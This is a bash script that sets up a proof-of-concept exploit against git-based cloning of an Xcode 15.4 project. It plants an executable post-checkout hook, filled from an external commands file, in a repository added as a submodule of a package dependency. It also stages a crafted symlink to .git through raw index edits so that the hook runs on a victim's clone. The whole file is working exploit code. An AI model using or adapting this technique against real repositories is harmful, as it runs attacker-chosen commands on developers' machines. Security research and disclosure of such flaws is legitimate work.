#!/bin/bash

FIN_REPO="git@github.com:p1tsi/fin.git"

# Xcode project's Package Dependency
DEP_REPO="git@github.com:p1tsi/dep.git" 

# Xcode project to clone with Xcode 15.4
POC_REPO="git@github.com:p1tsi/poc.git"

setup_fin() {

    # Clone the fin repository
	git clone "$FIN_REPO" fin

	# Navigate to the hook repository
	cd fin/ || exit

	# Create necessary directories and set up the post-checkout hook
	mkdir -p y/hooks
	cp ./.git/hooks/post-update.sample y/hooks/post-checkout # so u won't get the hook ignored

    # Add commands you what to execute remotely
    cat ../remote_commands.sh > y/hooks/post-checkout
    
	# Add and commit the post-checkout hook
	git add y/hooks/post-checkout
	git update-index --chmod=+x y/hooks/post-checkout
	git commit -m "Add executable post-checkout hook"

	# Push changes to the remote repository
	git push

    # Return to the parent directory
	cd ..
    
    # Remove existing directories
    rm -rf fin*
}

setup_dep() {

	# Clone the dep repository
	git clone "$DEP_REPO" dep

	# Navigate to the dep repository
	cd dep || exit

	# Clean up previous directories and remove submodule
	rm -rf a* A*
	git rm -r A/modules/x

	# Add the hook repository as a submodule
	git submodule add --name x/y "$FIN_REPO" A/modules/x
	git commit -m "Add submodule"
 
    cp ../Package.swift .
    git add Package.swift

	# Create a symlink to the .git directory
	# Print the string ".git" to a file named dotgit.txt
	printf .git > dotgit.txt

	# Generate a hash for the contents of dotgit.txt and store it in dot-git.hash
	# The `-w` option writes the object to the object database, and the hash is output
	git hash-object -w --stdin < dotgit.txt > dot-git.hash

	# Create an index info line for a symbolic link with the mode 120000
	# The line is formatted as: "120000 <hash> 0\ta"
	# 120000 indicates a symbolic link, <hash> is the content hash, and 'a' is the path in the index
	printf "120000 %s 0\ta\n" "$(cat dot-git.hash)" > index.info

	# Update the git index with the information from index.info
	# This effectively stages the symbolic link for the next commit
	git update-index --index-info < index.info

	# Commit the staged changes with a message "Add symlink"
	git commit -m "Add symlink"
	# Push changes to the remote repository
	git push
    
	# Return to the parent directory
	cd ..
    
    # Remove existing directories
    rm -rf dep*
}

setup_poc() {

    cd poc/ || exit

    # Init git repo
    git init --initial-branch=main

    # Link local repo to remote poc repo
    git remote add origin git@github.com:p1tsi/poc.git

    # Push everything
    git add .
    git commit -m "First Commit"
    git push origin main

}

# Execute functions
setup_fin
setup_dep
setup_poc


